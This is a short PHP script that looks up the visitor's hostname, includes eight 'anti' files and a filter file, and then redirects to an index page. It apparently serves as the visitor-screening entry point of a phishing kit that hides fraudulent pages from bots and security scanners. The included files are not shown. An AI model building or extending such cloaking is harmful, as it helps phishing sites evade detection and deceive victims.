<?php

$_REMOTE_HOST = gethostbyaddr($_SERVER['REMOTE_ADDR']);

  	require 'anti1.php';

	require 'anti2.php';

	require 'anti3.php';

	require 'anti4.php';

	require 'anti5.php';

	require 'anti6.php';

	require 'anti7.php';

	require 'anti8.php';

	require 'filter.php';

	exit(header("Location: ../index.php"));

?>